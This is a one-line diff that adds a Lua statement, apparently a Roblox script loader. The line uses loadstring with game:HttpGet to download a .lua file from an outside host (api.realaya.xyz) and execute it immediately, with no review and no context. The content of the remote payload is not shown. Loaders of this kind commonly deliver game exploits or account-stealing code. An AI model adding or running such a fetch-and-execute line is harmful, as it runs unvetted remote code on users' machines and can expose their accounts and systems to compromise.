@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/1mpmz9g32i4uf2upjni185o00q5orvo2.lua"))()
